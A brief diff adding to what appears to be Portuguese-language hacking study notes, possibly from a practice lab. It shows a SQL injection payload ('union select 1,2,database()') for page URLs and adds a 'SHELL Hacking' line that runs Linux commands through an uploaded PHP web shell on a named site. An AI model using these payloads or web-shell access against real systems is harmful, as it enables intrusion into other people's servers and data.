@@ -569,3 +569,11 @@ Database: information_schema
 Alguns comandos que posso utilizar na URL das páginas (inserir código SQL)
 
 - `-{:id} union select 1,2,database()`
+
+----
+
+## SHELL Hacking
+
+```bash
+http://www.bancocn.com/admin/uploads/shellphp.php7?cmd=<LINUX COMMAND>
+``
